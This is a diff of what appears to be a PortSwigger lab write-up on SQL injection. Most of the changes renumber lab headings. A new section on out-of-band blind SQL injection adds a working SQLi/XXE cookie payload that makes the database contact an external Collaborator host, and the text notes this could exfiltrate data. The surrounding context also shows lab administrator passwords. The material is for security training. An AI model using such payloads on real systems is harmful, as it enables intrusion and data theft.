@@ -531,7 +531,7 @@ password = tlxrz9r14m0uproqd9xv
 
 ![image](https://user-images.githubusercontent.com/123303806/236660830-4adcd85d-4bb0-4a9b-ab6b-303a345e08a4.png)
 
-**Lab #13: Blind SQL injection with time delays**
+**Lab #14: Blind SQL injection with time delays**
 
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
@@ -553,7 +553,7 @@ End Goal : To prove that the field is vulnerable to blind sqli(time based)
 
 ![WhatsApp Image 2023-05-31 at 10 06 03](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/84d6128b-e1bb-4fc5-ac16-11360cbbed0b)
 
-**Lab #14: Blind SQL injection with time delays and information retrieval**
+**Lab #15: Blind SQL injection with time delays and information retrieval**
 
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
@@ -604,7 +604,7 @@ So a is not the first character of the password.
 
 ![image](https://user-images.githubusercontent.com/123303806/236683522-1dbc9b99-74f7-401d-bb64-5b7f7ecb5164.png)
 
-**Lab #15: Blind SQL injection with time delays and information retrieval**
+**Lab #16: Blind SQL injection with time delays and information retrieval**
 
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
@@ -625,7 +625,7 @@ To solve the lab, log in as the administrator user.
 username : administrator 
 password : uq0k0oca9y9s2l2off6e
 
-**Lab : Visible error-based SQL injection**
+**Lab #13 : Visible error-based SQL injection**
 
 This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
 
@@ -643,6 +643,24 @@ The database contains a different table called users, with columns called userna
 
 ![WhatsApp Image 2023-05-31 at 10 06 03](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/98347ac2-d48d-45f1-b913-e3f06bc03cbf)
 
+**Lab #17 : Blind SQL injection with out-of-band interaction**
 
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
+Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
+The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application.
+
+![WhatsApp Image 2023-06-26 at 18 48 59](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/0066a881-9870-41f4-84e3-d0fe8cd4863e)
+
+![WhatsApp Image 2023-06-26 at 18 52 27](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/86f2f223-7217-41c7-b644-8a8cbb3ed6d0)
+
+![WhatsApp Image 2023-06-26 at 18 52 56](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/49eb5881-da0e-44b6-8eae-e641aef7bae4)
 
